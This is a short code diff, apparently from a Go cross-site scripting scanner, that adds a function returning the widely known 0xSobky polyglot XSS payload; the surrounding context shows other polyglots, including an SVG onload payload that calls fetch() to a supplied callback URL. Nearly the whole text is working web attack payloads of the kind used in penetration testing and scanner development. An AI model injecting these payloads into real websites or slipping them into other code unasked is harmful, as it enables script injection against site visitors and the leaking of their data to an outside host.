@@ -18,3 +18,9 @@ func GetPolyglots(callbackURL string) []string {
 		fmt.Sprintf("<![CDATA[<]]> <svg/onload=fetch('%s')>", callbackURL),
 	}
 }
+
+// GetDefaultPolyglot returns a generic polyglot payload for alert(1)
+func GetDefaultPolyglot() string {
+	// 0xSobky's Polyglot (Generic alert(1))
+	return "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e"
+}
